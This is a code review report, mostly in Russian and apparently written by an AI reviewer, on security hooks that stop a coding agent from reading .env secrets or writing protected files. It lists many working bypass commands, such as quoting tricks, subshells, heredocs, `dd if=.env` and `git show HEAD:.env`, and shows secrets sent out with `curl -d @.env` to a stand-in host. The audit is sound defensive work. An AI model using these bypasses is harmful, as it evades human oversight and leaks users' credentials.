---
phase: 01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti
reviewed: 2026-10-25T00:00:00Z
depth: standard
files_reviewed: 17
files_reviewed_list:
  - .claude/hooks/lib/hook-input.ts
  - .claude/hooks/lib/secret-names.ts
  - .claude/hooks/lib/shell.ts
  - .claude/hooks/protect-files.ts
  - .claude/hooks/reviewer-readonly.ts
  - .claude/settings.json
  - .claude/skills/review-step/SKILL.md
  - .prettierignore
  - AGENTS.md
  - CLAUDE.md
  - docs/memory.md
  - docs/plan.md
  - docs/security-checklist.md
  - tests/unit/protect-files.test.ts
  - tests/unit/reviewer-readonly.test.ts
  - tests/unit/secret-names.test.ts
  - tests/unit/settings-permissions.test.ts
findings:
  critical: 7
  warning: 8
  info: 3
  total: 18
status: issues_found
---

# Phase 1: Code Review Report

**Reviewed:** 2026-10-25
**Depth:** standard
**Files Reviewed:** 17
**Status:** issues_found

## Summary

Проверены hooks `protect-files` и `reviewer-readonly`, общий разбор shell (`lib/shell.ts`), предикаты секретных имён, `settings.json`, тесты и документы фазы. Каждый обход ниже воспроизведён запуском настоящих `checkBashDecision` и `checkReviewerCommand` через `tsx` (реальные `.env*` не читались; проверялась только строка-решение hook'а). Сам hook как процесс запускался только для случая с symlink (WR-05).

Главный вывод: разбор shell в `lib/shell.ts` расходится с bash в базовых местах (экранирование `\"` в двойных кавычках, `\<newline>`, `>|`, `>&`, `$'..'`, подоболочки `( )`, heredoc в stdin shell'а). Поэтому «закрыт» в `docs/security-checklist.md` для строк 7, 9, 10, 11 и 12 сейчас не соответствует действительности. Известные ограничения (`$VAR`, `$(...)`, глобы `.e*`, `python -c`, `eval`) в находки не включены. Все находки ниже в этот список не входят.

Структурные находки (fallow) не передавались.

## Critical Issues

### CR-01: `\"` внутри двойных кавычек рассинхронизирует разбор — всё после него невидимо для hook'а

**File:** `.claude/hooks/lib/shell.ts:33-37`
**Issue:** В режиме кавычек символ `\` просто добавляется в слово, а следующий `"` закрывает кавычку. В bash внутри `"..."` последовательность `\"` — это литерал, и кавычка не закрывается. Для `echo "\"" ; cat .env` bash выполнит `cat .env`, а tokenizer видит закрытую кавычку и сразу открывает новую, так что `; cat .env` оказывается «внутри строки». Воспроизведено: `echo "\""; cat .env` и `echo "\""; rm package-lock.json` → `PASS` (в обоих hook'ах нет ни deny, ни ask). Это обходит чтение `.env`, запись в `package-lock.json`/`.git/` и ask для `.claude/` одной тривиальной вставкой. Обратная рассинхронизация даёт ложные отказы на легитимных командах с `\"`.
**Fix:** В режиме `"` обрабатывать backslash как bash: `\` перед `"`, `\`, `$`, `` ` `` и newline экранирует следующий символ.
```ts
if (quote === '"' && ch === '\\' && next !== undefined && '"\\$`\n'.includes(next)) {
  if (next !== '\n') word += next; // \<newline> внутри кавычек удаляется
  i++;
  continue;
}
if (ch === quote) quote = null; else word += ch;
```
Добавить тесты: `echo "\""; cat .env` → deny, `echo "a\"b" > ok.txt` → null.

### CR-02: Операторы перенаправления `>|` и `>&` разрывают сегмент — цель записи не попадает в `writeTargets`

**File:** `.claude/hooks/lib/shell.ts:53-64, 74-83`
**Issue:** После `>` tokenizer не учитывает следующий символ `|` или `&`. `|` и `&` становятся управляющими операторами (`CONTROL_OPS`), сегмент закрывается, `pendingRedirect` сбрасывается, а цель превращается в имя «команды» следующего сегмента. Воспроизведено: `echo x >| .env`, `echo x >& .env`, `echo x >| package-lock.json`, `echo x >| .claude/settings.json` → `PASS`. `>|` перебивает `noclobber`, `>&file` — стандартная запись stdout+stderr в файл. Это прямой обход защиты записи, объявленной «закрытой» в строках 11 и 12 чек-листа (`echo > .env` — формулировка ДЗ-1).
**Fix:** После `>` проглатывать `|` и `&` (но `>&1`, `>&2` — дублирование дескриптора, не файл), как уже сделано для `&>>`:
```ts
if (ch === '>' || (ch === '&' && next === '>')) {
  // ...существующий код...
  if (command[i + 1] === '>') i++;      // >>
  if (command[i + 1] === '|') i++;      // >|
  else if (command[i + 1] === '&' && !/[\d-]/.test(command[i + 2] ?? '')) i++; // >&файл
  tokens.push({ kind: 'op', value: '>' });
  continue;
}
```

### CR-03: `\<newline>` и `$'..'` / `$".."` не сворачиваются как в bash — имя файла перестаёт быть `.env`

**File:** `.claude/hooks/lib/shell.ts:43-48` (и `:38-41`, `:84-85`)
**Issue:** (а) `\<newline>` в bash — продолжение строки и удаляется. Tokenizer добавляет `\n` в слово: `cat \<newline>.env` даёт слово `"\n.env"`, basename которого не начинается с `.env` → `PASS`. Воспроизведено, то же для `ca\<nl>t .env`, `rm \<nl>package-lock.json`. (б) `$'.env'` (ANSI-C quoting) и `$".env"`: символ `$` остаётся в слове, получается `$.env` → не секрет → `PASS` (оба hook'а, включая reviewer: `cat $'.env'`). Это не `$VAR`/`$(...)` из перечня известных ограничений, а синтаксис кавычек, который разбор обязан понимать.
**Fix:** В tokenizer: (а) `\` + `\n` вне кавычек — пропустить оба символа и не ставить `hasWord`; (б) если `$` непосредственно предшествует `'` или `"`, не добавлять `$` в слово, а `$'..'` разбирать с экранами `\xHH`, `\n` и т. п. или, если не умеем, возвращать `deny` для любого слова с `$'`/`$"`/`\` + newline (fail-closed).

### CR-04: Скобки подоболочки и process substitution — `(cat .env)`, `(rm .env)`, `cat <(cat .env)` проходят

**File:** `.claude/hooks/lib/secret-names.ts:15, 23-27` и `.claude/hooks/lib/shell.ts` (нет обработки `(` `)`)
**Issue:** `ENV_NAME_TAIL` отвергает хвост со скобкой, чтобы не блокировать обрывки вроде `.env*)`. Но `(cat .env)` разбирается в слова `(cat` и `.env)`: `.env)` не считается секретом, программа `(cat` — не в списках. Воспроизведено: `(cat .env)`, `(rm .env)`, `cat <(cat .env)` → `PASS`. Это обычная группировка и process substitution, а не `$(...)`/`$VAR`. Из-за того же `(rm package-lock.json)` и `{ rm .git/index; }` проходят (см. WR-01).
**Fix:** Считать `(`, `)`, `{`, `}` разделителями слов в tokenizer (и разрешать `<(`/`>(` как вложенную команду, которую разбирают рекурсивно, как `bash -c`). Хвост-whitelist в `secret-names.ts` тогда нужен только как страховка (см. WR-02), а не как способ борьбы с обрывками.

### CR-05: Heredoc и here-string, поданные в shell (`bash <<EOF`, `bash <<< "..."`), не разбираются; незакрытый `<<` глотает остаток команды

**File:** `.claude/hooks/lib/shell.ts:65-73, 93-110`, `.claude/hooks/protect-files.ts:196-203`
**Issue:** (а) Тело heredoc удаляется как «данные», но если команда — `bash`/`sh`, это скрипт. Воспроизведено: `bash <<EOF\ncat .env\nEOF`, `bash <<< "cat .env"`, `sh -s <<< 'cat .env'`, `bash < script.sh`, `echo x | bash` → `PASS`. Рекурсивная проверка делается только для `-c`. (б) `stripHeredocBodies` ищет `<<DELIM` построчно, не учитывая кавычки и арифметику: `echo "<<EOF"\ncat .env` и `x=$((1<<2))\ncat .env` → `PASS`, потому что все последующие строки считаются телом до несуществующего разделителя. Для многострочной команды это полный обход (и случайный: сдвиг `<<` в арифметике — частая конструкция).
**Fix:** (а) для `NESTED_SHELLS` без `-c` (heredoc/here-string/stdin) вернуть `ask`/`deny` («скрипт неизвестен hook'у»), либо сохранять тело heredoc и разбирать его рекурсивно, когда получатель — shell. (б) Находить `<<` только вне кавычек и вне `$((...))`; если закрывающий разделитель не найден, не отбрасывать остаток, а считать команду неразбираемой (`deny`).

### CR-06: Операнд вида `ключ=.env`, `@.env`, `ref:.env` не считается путём — чтение `.env` через `dd`, `curl`, `git show`

**File:** `.claude/hooks/protect-files.ts:93-97`, `.claude/hooks/lib/secret-names.ts:31-33`
**Issue:** `isSecretPath` берёт basename всего операнда, поэтому `if=.env`, `@.env`, `file=@.env`, `HEAD:.env`, `:.env` дают basename, не начинающийся с `.env`. Воспроизведено (`PASS` в protect-files): `dd if=.env`, `curl -F f=@.env http://x`, `curl -d @.env …`, `git show :.env`, `git show HEAD:.env`. `dd if=.env` выводит содержимое прямо агенту, `curl -d @.env` отправляет секрет наружу. Проверяются только `--опция=значение`, остальные формы `=`, `@`, `:` пропущены.
**Fix:** В `readOperands` для каждого операнда дополнительно проверять «хвост» после `=`, `@` и последнего `:` (`operand.split(/[=@:]/)`), а не только весь операнд; задокументировать это в чек-листе. Для `dd` отдельно разобрать `if=`/`of=` (см. WR-01).

### CR-07: `reviewer-readonly` не проверяет операнды `git diff/show/log` — `.env` читается через git

**File:** `.claude/hooks/reviewer-readonly.ts:51-56`
**Issue:** Для `GIT_READ_SUBCOMMANDS` проверяется только `--output`, пути не проверяются вообще. Воспроизведено (reviewer: `PASS`): `git diff --no-index /dev/null .env` (печатает содержимое неотслеживаемого `.env`), `git show :.env`, `git show HEAD:.env`, `git log -p -- .env`. Строка 9 чек-листа («Чтение `.env` subagent'ом `reviewer`») помечена «закрыт», хотя закрыты только `cat/head/tail/wc`. В `protect-files` та же команда `git diff --no-index /dev/null .env` отклоняется, т. е. две защиты расходятся.
**Fix:** Применить к операндам git ту же проверку, что и к `cat` (`isSecretPath` для каждого операнда, включая части после `:`), а `--no-index` для reviewer запретить целиком:
```ts
if (GIT_READ_SUBCOMMANDS.has(subcommand)) {
  if (args.some((a) => a.startsWith('--output') || a === '--no-index')) return deny(...);
  if (args.some((a) => a.split(/[:=]/).some(isSecretPath))) return deny(trimmed, 'чтение секретных файлов .env* запрещено');
  return null;
}
```
И вынести общий «поиск секретного операнда» в `secret-names.ts`, чтобы hooks не расходились.

## Warnings

### WR-01: Проверка записи привязана к имени первой команды — обёртки, ключевые слова и неполный список писателей обходят `package-lock.json`, `.git/`, `.claude/`

**File:** `.claude/hooks/protect-files.ts:9-13, 166-180`
**Issue:** `program` берётся из `words[0]` (с единственным особым случаем `sudo` без опций). Воспроизведено (`PASS`): `FOO=1 rm package-lock.json`, `env sed -i s/a/b/ package-lock.json`, `nohup rm package-lock.json`, `xargs rm package-lock.json`, `(rm package-lock.json)`, `{ rm .git/index; }`, `if true; then rm package-lock.json; fi` (программа = `then`), `env sed -i … .claude/settings.json` (даже ask не срабатывает), `sudo -u root rm …` (после `sudo` имя = `-u`). Список писателей неполон: `dd of=…`, `curl -o …`, `wget -O …`, `find … -delete`, `git rm/checkout/apply/restore`, `cp -t DIR src`/`mv -t DIR src` (последний аргумент — источник; воспроизведено для `.claude/hooks`). Для самого `.env` обход частично закрывается общим сканом операндов (чтение), поэтому там проблема проявляется только вместе с CR-04.
**Fix:** Перед определением `program` снимать префикс: присваивания `NAME=value`, `env`/`command`/`nohup`/`time`/`exec`/`nice`/`timeout N`, ключевые слова `then`/`do`/`else`/`!`/`{`, опции `sudo`. Добавить `dd` (`of=`), `curl`/`wget` (`-o`/`-O`/`--output`) в список писателей; для `cp`/`mv`/`install` учитывать `-t`/`--target-directory`. Либо сменить подход: любой операнд, указывающий на `package-lock.json`/`.git/`/`.claude/`, вне `NON_READING_PROGRAMS` и известных read-only команд даёт `ask`.

### WR-02: Whitelist символов в `ENV_NAME_TAIL` превращает любое нестандартное имя в «не секрет» (fail-open)

**File:** `.claude/hooks/lib/secret-names.ts:15, 23-27`
**Issue:** Секретом считается только `.env` + хвост из `[A-Za-z0-9_.\-*?[\]]*`. Воспроизведено (`PASS` в обоих hook'ах): `cat .env~` (бэкап редактора с теми же секретами), `cat .env:x`, `cat .env#`, `cat .env{,}` (brace expansion раскрывается в `.env .env`), `cat .env{,.local}`. Документированы глобы вроде `.e*`, но не фигурные скобки и не имена с `~`. Исключение сделано ради обрывков типа `.env*)`, то есть ради борьбы с ложными срабатываниями на недоразобранных подстановках, ценой дыры в защите.
**Fix:** Развернуть логику: секрет — любое `.env*`, кроме `ENV_TEMPLATES`; ложные срабатывания от обрывков устранять в tokenizer (см. CR-04), а не в предикате. Как минимум добавить `~`, `{`, `}`, `,`, `:` и `#` в разрешённый хвост.

### WR-03: `gitAddForceDecision` пропускает `git -C/-c … add -f`, каталоги без `/`, `..` и сокращённые `--forc`; `.envrc` не в `.gitignore`

**File:** `.claude/hooks/protect-files.ts:124-147`, `.gitignore`
**Issue:** Проверка требует `args[0] === 'add'`. Воспроизведено (`PASS`): `git -C . add -f .`, `git -c core.x=1 add --force .`, `git add -f ..`, `git add --force src` (комментарий в коде признаёт «каталог без `/` не распознаётся», но чек-лист строка 10 говорит «закрыт»), `git add --forc .` (git принимает однозначные сокращения длинных опций). Кроме того, `.gitignore` содержит `.env` и `.env.*`, но не `.envrc`; hook разрешает `git add .` и `git add -A` (тесты закрепляют это), поэтому неотслеживаемый `.envrc` попадёт в коммит без всякого `-f`. Тест «blocks forced git add: `git add .envrc`» этого не ловит.
**Fix:** Пропускать глобальные опции git (`-C <dir>`, `-c <k=v>`, `--git-dir=…`) до подкоманды; считать `-f` любую опцию, являющуюся префиксом `--force` (≥`--fo`); при форсе любой путь без точного имени файла считать широким (`deny`/`ask`); добавить `.envrc` в `.gitignore` и отдельный тест на `git add -A` с `.envrc`.

### WR-04: Рекурсивный `grep -r` по каталогу читает `.env`, а чек-лист называет `grep` закрытым

**File:** `.claude/hooks/protect-files.ts:44-82`, `docs/security-checklist.md:7`
**Issue:** Hook проверяет только операнды-пути. `grep -rn "KEY" .` и `grep -r token src/ ..` обходят каталоги и печатают строки из `.env` (grep не пропускает точечные файлы, в отличие от `rg`, который по умолчанию уважает `.gitignore`). Это самый вероятный случайный сценарий утечки, а в ограничения (строка 3 чек-листа) он не вынесен. Проверено: `grep -r KEY .` → `PASS`.
**Fix:** Для `grep`/`egrep`/`fgrep` с `-r`/`-R`/`--recursive` (в т. ч. в склеенных флагах) требовать `--exclude=.env*`/`--exclude-dir` либо возвращать `ask`; для `rg` — `deny` при `--hidden`/`-u`/`--no-ignore`. Во всяком случае добавить пункт в раздел ограничений чек-листа.

### WR-05: `isMain` сравнивает `argv[1]` без realpath — hook молча отключается, если запущен по пути с symlink

**File:** `.claude/hooks/lib/hook-input.ts:26-29`
**Issue:** `import.meta.url` в Node — realpath файла, `process.argv[1]` — путь «как передан». Воспроизведено: `…/scratchpad/lnk/node_modules/.bin/tsx …/lnk/.claude/hooks/protect-files.ts < input` с командой `cat ./.env` → код 0, пустой вывод, ни отказа, ни сообщения; тот же вход напрямую → код 2. Если `CLAUDE_PROJECT_DIR` приходит через symlink (проект в симлинкнутом каталоге, WSL-домашняя папка и т. п.), весь `main` не выполняется — защита отключена тихо. Это fail-open, не описанный в чек-листе (строка 14 говорит только об отсутствии `tsx`).
**Fix:**
```ts
import { realpathSync } from 'node:fs';
export function isMain(moduleUrl: string): boolean {
  const script = process.argv[1];
  if (script === undefined) return false;
  try { return moduleUrl === pathToFileURL(realpathSync(script)).href; }
  catch { return false; }
}
```
Либо вообще не использовать `isMain`, а вынести `main()` в отдельный `*-cli.ts`, который тесты не импортируют.

### WR-06: Ложные отказы на легитимных командах, в том числе на исправлении утечки секрета

**File:** `.claude/hooks/protect-files.ts:188-193`
**Issue:** Любой операнд `.env*` у любой команды, кроме `ls/test/[/stat`, считается чтением. Воспроизведено (`deny`): `git check-ignore -v .env` (проверка, что `.gitignore` работает), `echo ".env" >> .gitignore`, `find . -name ".env*"`, `tar --exclude=.env -czf a.tgz .`, `docker run --env-file .env x`, `git rm --cached .env`. Отказ без обходного пути в той же команде подталкивает агента искать обход (редкий случай: `git rm --cached .env` — штатное исправление закоммиченного секрета).
**Fix:** Расширить `NON_READING_PROGRAMS`/правила: `git` с `check-ignore`, `ls-files`, `rm --cached`, `status`; `find` (операнд после `-name`/`-path`); значения `--exclude*`; для `echo`/`printf` считать `.env` данными, а не файлом. Остальное — `ask` вместо `deny` для команд, которые не печатают содержимое.

### WR-07: Settings: deny на запись `.env*` и ask на `.claude/` действуют только для относительных путей от корня; hook — единственная защита и он fail-open

**File:** `.claude/settings.json:33, 42, 59`, `tests/unit/settings-permissions.test.ts:29-69`
**Issue:** `Edit(./.env*)` и `Edit(./package-lock.json)` совпадают только с файлами в корне; для `config/.env`, `packages/x/package-lock.json` правила нет (есть лишь `Read(**/.env*)`), и защиту записи держит только hook (который отключается при отсутствии `tsx`, см. строку 14 чек-листа, и при WR-05). `Edit(./.claude/**)` не покрывает `~/.claude` и абсолютные пути. Тесты проверяют наличие строк, а не симметрию правил чтения и записи.
**Fix:** Добавить `Edit(**/.env*)`, `Edit(**/package-lock.json)`; в `settings-permissions.test.ts` проверить, что для каждого `Read(...)`-deny есть парный `Edit(...)`-deny. Записать оставшееся ограничение (глобальный `~/.claude`) в чек-лист.

### WR-08: Документы расходятся с новым правилом «единый источник плана» и завышают статус «закрыт»

**File:** `README.md:34, 49` (вне списка, но связан с правкой `AGENTS.md:9, 72`), `docs/security-checklist.md:7-12`, `docs/memory.md` (запись 2026-10-25)
**Issue:** (а) README по-прежнему называет `docs/plan.md` источником «плана и прогресса» и говорит «прогресс отмечается в `docs/plan.md`», что прямо противоречит новому правилу `AGENTS.md:72` («в `docs/plan.md` его не дублировать») и `SKILL.md:43`. Критерий успеха из `ROADMAP.md` проверяет `grep` только по `AGENTS.md CLAUDE.md docs .planning`, README не входит. (б) Строки 7, 9, 10, 11, 12 чек-листа помечены «закрыт» и перечисляют формы, которые закрыты, не называя найденных здесь обходов (CR-01…CR-07, WR-01…WR-05); `memory.md` фиксирует «6 закрыто, каждая проверена», хотя команда проверки — это тесты, не содержащие этих кейсов, то есть «проверено» означает «тесты зелёные», а не «обходов нет».
**Fix:** Исправить README (строки 34 и 49) на `.planning/STATE.md` / `.planning/ROADMAP.md`; расширить критерий `grep` на `README.md`. В чек-листе перевести затронутые строки в «закрыт частично» с перечнем известных обходов либо закрыть их исправлениями выше и добавить тесты.

## Info

### IN-01: Дублирующийся импорт из одного модуля в тесте

**File:** `tests/unit/protect-files.test.ts:4-5`
**Issue:** Две строки `import … from '../../.claude/hooks/protect-files.js'`.
**Fix:** Объединить в `import { checkBashCommand, checkBashDecision, checkFilePath } from …`.

### IN-02: Тесты закрепляют только заявленные формы и не содержат найденных обходов

**File:** `tests/unit/protect-files.test.ts`, `tests/unit/reviewer-readonly.test.ts`
**Issue:** Нет кейсов на `>|`, `>&`, `\"` в кавычках, `\<newline>`, `$'.env'`, `(cat .env)`, `bash <<EOF`, `dd if=.env`, `git show HEAD:.env`, `git diff --no-index`, `FOO=1 rm package-lock.json`, `git -C . add -f .`, `grep -r`. Для `reviewer-readonly` нет и теста процесса hook'а (как `protect-files hook process`). После исправления каждого пункта нужен пара «блокируется» плюс «рядом лежащая легитимная команда проходит» (например `echo "a\"b" > notes.md`).
**Fix:** Добавить `it.each`-блоки с этими командами в соответствующие `describe`.

### IN-03: `allowed-tools` в `review-step` шире, чем белый список hook'а `reviewer`

**File:** `.claude/skills/review-step/SKILL.md:8`
**Issue:** `Bash(git branch:*)` заранее разрешает любые формы `git branch`, включая `-D`/`-m`; блокирует их только hook `reviewer-readonly`. При fail-open hook'а (строка 14 чек-листа, WR-05) отсечки не будет.
**Fix:** Перечислить конкретные формы, как в `settings.json` (`git branch --show-current`, `git branch --list`, …), вместо `git branch:*`.

---

_Reviewed: 2026-10-25_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
